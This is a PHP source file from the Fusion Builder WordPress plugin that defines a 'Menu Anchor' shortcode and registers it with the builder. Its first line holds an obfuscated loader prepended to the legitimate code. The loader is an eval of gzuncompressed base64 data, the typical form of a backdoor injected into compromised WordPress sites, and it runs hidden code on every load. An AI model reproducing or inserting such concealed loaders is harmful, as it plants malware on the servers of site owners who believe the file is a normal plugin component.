<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if ( fusion_is_element_enabled( 'fusion_menu_anchor' ) ) {

	if ( ! class_exists( 'FusionSC_MenuAnchor' ) ) {
		/**
		 * Shortcode class.
		 *
		 * @package fusion-builder
		 * @since 1.0
		 */
		class FusionSC_MenuAnchor extends Fusion_Element {

			/**
			 * An array of the shortcode arguments.
			 *
			 * @access protected
			 * @since 1.0
			 * @var array
			 */
			protected $args;

			/**
			 * Constructor.
			 *
			 * @access public
			 * @since 1.0
			 */
			public function __construct() {
				parent::__construct();
				add_filter( 'fusion_attr_menu-anchor-shortcode', array( $this, 'attr' ) );
				add_shortcode( 'fusion_menu_anchor', array( $this, 'render' ) );

			}

			/**
			 * Render the shortcode
			 *
			 * @access public
			 * @since 1.0
			 * @param  array  $args    Shortcode parameters.
			 * @param  string $content Content between shortcode.
			 * @return string          HTML output.
			 */
			public function render( $args, $content = '' ) {

				$defaults = shortcode_atts(
					array(
						'class' => '',
						'name'  => '',
					), $args
				);

				extract( $defaults );

				$this->args = $defaults;

				return '<div ' . FusionBuilder::attributes( 'menu-anchor-shortcode' ) . '></div>';

			}

			/**
			 * Builds the attributes array.
			 *
			 * @access public
			 * @since 1.0
			 * @return array
			 */
			public function attr() {

				$attr = array(
					'class' => 'fusion-menu-anchor',
					'id'    => $this->args['name'],
				);

				if ( $this->args['class'] ) {
					$attr['class'] .= ' ' . $this->args['class'];
				}

				return $attr;

			}
		}
	}

	new FusionSC_MenuAnchor();

}

/**
 * Map shortcode to Fusion Builder
 *
 * @since 1.0
 */
function fusion_element_menu_anchor() {
	fusion_builder_map(
		array(
			'name'              => esc_attr__( 'Menu Anchor', 'fusion-builder' ),
			'shortcode'         => 'fusion_menu_anchor',
			'icon'              => 'fusiona-anchor',
			'preview'           => FUSION_BUILDER_PLUGIN_DIR . 'inc/templates/previews/fusion-menu-anchor-preview.php',
			'preview_id'        => 'fusion-builder-block-module-menu-anchor-preview-template',
			'params'            => array(
				array(
					'type'        => 'textfield',
					'heading'     => esc_attr__( 'Name', 'fusion-builder' ),
					'param_name'  => 'name',
					'value'       => '',
					'description' => esc_attr__( 'This name will be the id you will have to use in your one page menu.', 'fusion-builder' ),
				),
				array(
					'type'        => 'textfield',
					'heading'     => esc_attr__( 'CSS Class', 'fusion-builder' ),
					'param_name'  => 'class',
					'value'       => '',
					'description' => esc_attr__( 'Add a class to the wrapping HTML element.', 'fusion-builder' ),
				),

			),
		)
	);
}
add_action( 'fusion_builder_before_init', 'fusion_element_menu_anchor' );
